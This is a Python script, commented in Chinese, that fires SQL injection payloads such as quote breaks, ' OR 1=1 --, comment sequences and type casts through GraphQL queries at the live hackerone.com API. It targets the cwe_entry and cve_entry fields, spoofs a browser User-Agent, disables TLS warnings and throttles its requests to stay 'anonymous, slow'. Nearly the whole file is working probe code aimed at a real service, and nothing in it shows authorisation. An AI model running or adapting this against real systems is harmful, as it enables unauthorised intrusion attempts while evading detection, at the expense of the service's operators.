# -*- coding: utf-8 -*-
"""h1x49k3d: cwe-89 有效格式注入载荷 + CVE 对照(匿名,慢速)——最终闭合"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, qstr, timeout=20):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        body = r.text.replace('\n', ' ')[:250]
        print(f'--- {name} [{r.status_code} {dt}s] {body}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
    time.sleep(2.5)

def jd(v):
    return json.dumps(v, ensure_ascii=False)

Q = chr(39)
# cwe-89 有效格式 + 注入载荷
for v in ['cwe-89', 'cwe-89' + Q, 'cwe-89' + Q + ' OR 1=1 --', 'cwe-89' + Q + '--',
          'cwe-89%', '%cwe-89%', 'cwe-89\\', 'cwe-89/**/', "cwe-89'::int--",
          'cwe-89' + Q + ' OR ' + Q + '1' + Q + '=' + Q + '1', 'cwe-89 ']:
    probe('CWE_v ' + repr(v)[:24], '{ cwe_entry(cwe_id: %s) { id } }' % jd(v))
# CVE-2014-0160 有效格式 + 注入载荷(对照)
for v in ['CVE-2014-0160' + Q, 'CVE-2014-0160' + Q + ' OR 1=1 --', 'CVE-2014-0160%', '%CVE-2014-0160%',
          'CVE-2014-0160\\', "CVE-2014-0160'::int--"]:
    probe('CVE_v ' + repr(v)[:24], '{ cve_entry(cve_id: %s) { id } }' % jd(v))
